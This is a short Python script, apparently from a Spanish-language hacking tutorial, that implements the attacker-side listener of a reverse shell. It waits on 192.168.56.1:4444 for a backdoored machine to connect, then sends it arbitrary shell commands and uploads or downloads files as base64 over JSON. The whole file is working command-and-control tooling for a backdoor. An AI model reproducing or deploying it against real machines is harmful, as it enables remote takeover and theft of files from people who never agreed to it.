#!/usr/bin/env python
import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos un aconexion de:  " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)  # Convertir a JSON
        self.connection.send(json_data.encode())  # Convertir a bytes

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()  # Decodificar bytes
                return json.loads(json_data)  # Convertir de JSON a diccionario
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)  # Enviar el comando al cliente

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()  # Recibir respuesta del cliente

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Decodificar a str

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "subir":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "descargar" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception as e:
                result = f"[-] Error during command execution: {e}"

            print(result)

my_listener = Listener("192.168.56.1", 4444)
my_listener.run()
